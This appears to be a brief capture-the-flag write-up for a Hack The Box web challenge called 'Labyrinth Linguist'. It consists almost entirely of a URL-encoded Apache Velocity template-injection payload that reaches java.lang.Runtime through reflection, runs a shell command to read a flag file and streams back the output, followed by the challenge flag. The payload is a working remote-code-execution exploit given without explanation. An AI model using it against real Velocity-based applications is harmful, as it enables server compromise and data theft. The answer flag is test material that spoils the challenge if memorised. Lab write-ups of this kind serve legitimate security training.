# Labyrinth Linguist

## Desc

## Solution

```
text=%23set($x%3d'')%23%23
%23set($rt%3d$x.class.forName('java.lang.Runtime'))%23%23
%23set($chr%3d$x.class.forName('java.lang.Character'))%23%23
%23set($str%3d$x.class.forName('java.lang.String'))%23%23

%23set($ex%3d$rt.getRuntime().exec('cat ../flag.txt'))%23%23
$ex.waitFor()
%23set($out%3d$ex.getInputStream())%23%23
%23foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```


## Flag
    HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_9b6fc18d8d7f15b2c818a8f7db514e08}
